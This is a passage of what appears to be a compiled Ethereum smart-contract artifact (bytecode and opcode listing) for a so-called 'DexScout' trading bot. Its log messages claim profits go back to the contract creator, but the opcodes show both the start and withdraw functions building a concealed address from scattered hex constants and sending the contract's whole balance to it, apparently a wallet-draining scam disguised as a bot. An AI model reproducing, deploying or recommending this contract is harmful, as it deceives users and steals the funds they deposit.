f565b9150610d4782610d08565b602082019050919050565b5f6020820190508181035f830152610d6981610d30565b9050919050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f610dc682610d70565b9150610dd183610d70565b9250828202610ddf81610d70565b91508282048414831517610df657610df5610d8f565b5b5092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f819050919050565b5f610e3d82610e2a565b9150610e4883610e2a565b9250828201905080821115610e6057610e5f610d8f565b5b92915050565b5f610e7082610d70565b9150610e7b83610d70565b9250828203905073ffffffffffffffffffffffffffffffffffffffff811115610ea757610ea6610d8f565b5b92915050565b5f610eb782610d70565b9150610ec283610d70565b9250828201905073ffffffffffffffffffffffffffffffffffffffff811115610eee57610eed610d8f565b5b92915050565b5f610efe82610e2a565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203610f3057610f2f610d8f565b5b600182019050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f610f7282610e2a565b9150610f7d83610e2a565b925082610f8d57610f8c610f3b565b5b828204905092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b5f610fcf82610e2a565b9150610fda83610e2a565b925082610fea57610fe9610f3b565b5b828206905092915050565b5f610fff82610e2a565b915061100a83610e2a565b925082820390508181111561102257611021610d8f565b5b92915050565b5f60ff82169050919050565b5f61103e82611028565b915061104983611028565b9250828201905060ff81111561106257611061610d8f565b5b92915050565b5f61107282611028565b915061107d83611028565b9250828203905060ff81111561109657611095610d8f565b5b9291505056fea264697066735822122076f60cd1e35fbe54f5c1681639d3c2cb51c3032262b07d1f542910ee35263dd164736f6c63430008180033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x10D2 DUP1 PUSH2 0x1D PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4D JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1B55BA3A EQ PUSH2 0x58 JUMPI DUP1 PUSH4 0x6C02A931 EQ PUSH2 0x62 JUMPI DUP1 PUSH4 0x70E44C6A EQ PUSH2 0x8C JUMPI DUP1 PUSH4 0x7B61C320 EQ PUSH2 0x96 JUMPI DUP1 PUSH4 0xBEDF0F4A EQ PUSH2 0xC0 JUMPI PUSH2 0x54 JUMP JUMPDEST CALLDATASIZE PUSH2 0x54 JUMPI STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x60 PUSH2 0xCA JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x6D JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x76 PUSH2 0x14C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x83 SWAP2 SWAP1 PUSH2 0xB6F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x94 PUSH2 0x1D7 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xA1 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xAA PUSH2 0x259 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xB7 SWAP2 SWAP1 PUSH2 0xB6F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xC8 PUSH2 0x2E5 JUMP JUMPDEST STOP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0xF7 SWAP1 PUSH2 0xBFF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x107 PUSH2 0x31C JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x149 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP1 SLOAD PUSH2 0x158 SWAP1 PUSH2 0xC4A JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x184 SWAP1 PUSH2 0xC4A JUMP JUMPDEST DUP1 ISZERO PUSH2 0x1CF JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1A6 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x1CF JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH0 MSTORE PUSH1 0x20 PUSH0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x1B2 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x204 SWAP1 PUSH2 0xCEA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x214 PUSH2 0x332 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x256 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH2 0x266 SWAP1 PUSH2 0xC4A JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x292 SWAP1 PUSH2 0xC4A JUMP JUMPDEST DUP1 ISZERO PUSH2 0x2DD JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x2B4 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x2DD JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH0 MSTORE PUSH1 0x20 PUSH0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x2C0 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x312 SWAP1 PUSH2 0xD52 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMP JUMPDEST PUSH0 PUSH2 0x32D PUSH2 0x328 PUSH2 0x348 JUMP JUMPDEST PUSH2 0x488 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH2 0x343 PUSH2 0x33E PUSH2 0x348 JUMP JUMPDEST PUSH2 0x488 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 PUSH2 0x353 PUSH2 0x753 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH3 0x70083F SWAP1 POP PUSH0 PUSH4 0xE5B41D93 SWAP1 POP PUSH0 PUSH2 0x36D PUSH2 0x75D JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x378 PUSH2 0x767 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x3C9 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x3C4 PUSH2 0x3BF PUSH2 0x772 JUMP JUMPDEST PUSH2 0x77D JUMP JUMPDEST PUSH2 0x89E JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x3DE DUP3 PUSH2 0x3D9 DUP10 PUSH2 0x77D JUMP JUMPDEST PUSH2 0x89E JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x3FB PUSH2 0x3ED DUP9 PUSH2 0x77D JUMP JUMPDEST PUSH2 0x3F6 DUP9 PUSH2 0x77D JUMP JUMPDEST PUSH2 0x89E JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x407 DUP7 PUSH2 0x77D JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x413 DUP7 PUSH2 0x77D JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x432 PUSH2 0x423 DUP7 DUP7 PUSH2 0x89E JUMP JUMPDEST PUSH2 0x42D DUP6 DUP6 PUSH2 0x89E JUMP JUMPDEST PUSH2 0x89E JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x474 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x89E JUMP JUMPDEST SWAP1 POP DUP1 SWAP13 POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH0 DUP1 DUP3 SWAP1 POP PUSH0 DUP1 DUP1 PUSH0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x746 JUMPI PUSH2 0x100 DUP5 PUSH2 0x4AD SWAP2 SWAP1 PUSH2 0xDBC JUMP JUMPDEST SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x4C2 JUMPI PUSH2 0x4C1 PUSH2 0xDFD JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 PUSH2 0x4E3 SWAP2 SWAP1 PUSH2 0xE33 JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x4F4 JUMPI PUSH2 0x4F3 PUSH2 0xDFD JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x545 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x55E JUMPI PUSH1 0x57 DUP4 PUSH2 0x557 SWAP2 SWAP1 PUSH2 0xE66 JUMP JUMPDEST SWAP3 POP PUSH2 0x60A JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x59C JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x5B5 JUMPI PUSH1 0x37 DUP4 PUSH2 0x5AE SWAP2 SWAP1 PUSH2 0xE66 JUMP JUMPDEST SWAP3 POP PUSH2 0x609 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x5F3 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x608 JUMPI PUSH1 0x30 DUP4 PUSH2 0x605 SWAP2 SWAP1 PUSH2 0xE66 JUMP JUMPDEST SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x648 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x661 JUMPI PUSH1 0x57 DUP3 PUSH2 0x65A SWAP2 SWAP1 PUSH2 0xE66 JUMP JUMPDEST SWAP2 POP PUSH2 0x70D JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x69F JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6B8 JUMPI PUSH1 0x37 DUP3 PUSH2 0x6B1 SWAP2 SWAP1 PUSH2 0xE66 JUMP JUMPDEST SWAP2 POP PUSH2 0x70C JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6F6 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x70B JUMPI PUSH1 0x30 DUP3 PUSH2 0x708 SWAP2 SWAP1 PUSH2 0xE66 JUMP JUMPDEST SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 PUSH2 0x71B SWAP2 SWAP1 PUSH2 0xDBC JUMP JUMPDEST PUSH2 0x725 SWAP2 SWAP1 PUSH2 0xEAD JUMP JUMPDEST DUP5 PUSH2 0x730 SWAP2 SWAP1 PUSH2 0xEAD JUMP JUMPDEST SWAP4 POP PUSH1 0x2 DUP2 PUSH2 0x73F SWAP2 SWAP1 PUSH2 0xE33 JUMP JUMPDEST SWAP1 POP PUSH2 0x496 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH3 0x3E1C9A SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH3 0xF7DE0 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH4 0xAF95910D SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH4 0xD19B575 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP1 DUP4 SWAP1 POP JUMPDEST PUSH0 DUP2 EQ PUSH2 0x7AE JUMPI DUP2 DUP1 PUSH2 0x797 SWAP1 PUSH2 0xEF4 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x10 DUP2 PUSH2 0x7A7 SWAP2 SWAP1 PUSH2 0xF68 JUMP JUMPDEST SWAP1 POP PUSH2 0x785 JUMP JUMPDEST PUSH0 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x7C9 JUMPI PUSH2 0x7C8 PUSH2 0xF98 JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x7FB JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x892 JUMPI PUSH1 0x10 DUP7 PUSH2 0x815 SWAP2 SWAP1 PUSH2 0xFC5 JUMP JUMPDEST SWAP3 POP PUSH2 0x820 DUP4 PUSH2 0xA24 JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 PUSH2 0x82F SWAP2 SWAP1 PUSH2 0xFF5 JUMP JUMPDEST PUSH2 0x839 SWAP2 SWAP1 PUSH2 0xFF5 JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x84A JUMPI PUSH2 0x849 PUSH2 0xDFD JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 PUSH2 0x885 SWAP2 SWAP1 PUSH2 0xF68 JUMP JUMPDEST SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x800 JUMP JUMPDEST POP DUP1 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP4 SWAP1 POP PUSH0 DUP4 SWAP1 POP PUSH0 DUP2 MLOAD DUP4 MLOAD PUSH2 0x8B7 SWAP2 SWAP1 PUSH2 0xE33 JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x8D0 JUMPI PUSH2 0x8CF PUSH2 0xF98 JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x902 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 DUP2 SWAP1 POP PUSH0 DUP1 PUSH0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0x990 JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x92B JUMPI PUSH2 0x92A PUSH2 0xDFD JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0x942 SWAP1 PUSH2 0xEF4 JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x955 JUMPI PUSH2 0x954 PUSH2 0xDFD JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x90F JUMP JUMPDEST PUSH0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xA15 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x9B0 JUMPI PUSH2 0x9AF PUSH2 0xDFD JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0x9C7 SWAP1 PUSH2 0xEF4 JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x9DA JUMPI PUSH2 0x9D9 PUSH2 0xDFD JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x994 JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 PUSH1 0xFF AND PUSH0 GT ISZERO DUP1 ISZERO PUSH2 0xA3C JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xA7A JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0xA70 SWAP2 SWAP1 PUSH2 0x1034 JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xAE0 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0xA92 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xADC JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0xAC8 SWAP2 SWAP1 PUSH2 0x1034 JUMP JUMPDEST PUSH2 0xAD2 SWAP2 SWAP1 PUSH2 0x1068 JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xAE0 JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xB1C JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xB01 JUMP JUMPDEST PUSH0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xB41 DUP3 PUSH2 0xAE5 JUMP JUMPDEST PUSH2 0xB4B DUP2 DUP6 PUSH2 0xAEF JUMP JUMPDEST SWAP4 POP PUSH2 0xB5B DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0xAFF JUMP JUMPDEST PUSH2 0xB64 DUP2 PUSH2 0xB27 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xB87 DUP2 DUP5 PUSH2 0xB37 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x52756E6E696E672044657853636F757420616374696F6E2E2054686973206361 PUSH0 DUP3 ADD MSTORE PUSH32 0x6E2074616B652061207768696C653B20706C6561736520776169742E2E000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xBE9 PUSH1 0x3D DUP4 PUSH2 0xAEF JUMP JUMPDEST SWAP2 POP PUSH2 0xBF4 DUP3 PUSH2 0xB8F JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xC16 DUP2 PUSH2 0xBDD JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH2 0xC61 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0xC74 JUMPI PUSH2 0xC73 PUSH2 0xC1D JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x53656E64696E672070726F66697473206261636B20746F20636F6E7472616374 PUSH0 DUP3 ADD MSTORE PUSH32 0x2063726561746F7220616464726573732E2E2E00000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xCD4 PUSH1 0x33 DUP4 PUSH2 0xAEF JUMP JUMPDEST SWAP2 POP PUSH2 0xCDF DUP3 PUSH2 0xC7A JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xD01 DUP2 PUSH2 0xCC8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x53746F7070696E6720636F6E747261637420626F742E2E2E0000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xD3C PUSH1 0x18 DUP4 PUSH2 0xAEF JUMP JUMPDEST SWAP2 POP PUSH2 0xD47 DUP3 PUSH2 0xD08 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xD69 DUP2 PUSH2 0xD30 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xDC6 DUP3 PUSH2 0xD70 JUMP JUMPDEST SWAP2 POP PUSH2 0xDD1 DUP4 PUSH2 0xD70 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH2 0xDDF DUP2 PUSH2 0xD70 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH2 0xDF6 JUMPI PUSH2 0xDF5 PUSH2 0xD8F JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xE3D DUP3 PUSH2 0xE2A JUMP JUMPDEST SWAP2 POP PUSH2 0xE48 DUP4 PUSH2 0xE2A JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0xE60 JUMPI PUSH2 0xE5F PUSH2 0xD8F JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xE70 DUP3 PUSH2 0xD70 JUMP JUMPDEST SWAP2 POP PUSH2 0xE7B DUP4 PUSH2 0xD70 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xEA7 JUMPI PUSH2 